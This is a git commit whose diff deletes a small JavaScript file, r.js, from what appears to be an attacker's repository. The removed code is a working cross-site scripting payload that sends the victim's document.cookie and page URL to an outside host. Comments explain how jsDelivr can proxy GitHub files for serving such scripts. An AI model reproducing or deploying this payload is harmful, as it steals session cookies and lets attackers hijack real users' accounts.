efd9aee89972e7643dba4762e7704b70ba41b791
0xQRx <157332395+0xQRx@users.noreply.github.com>
2026-02-04 15:16:16 -0500

    x

--- r.js
+++
@@ -1,5 +0,0 @@
-new Image().src = "https://0qx.cc:9090/cookies=" + encodeURIComponent(document.cookie) + "&url=" + encodeURIComponent(location.href);
-
-// https://cdn.jsdelivr.net/ will allow you to proxy any file on github.com
-// https://cdn.jsdelivr.net/gh/<username>/<project>/<filename>
-// https://cdn.jsdelivr.net/gh/0xQRx/x/h.js
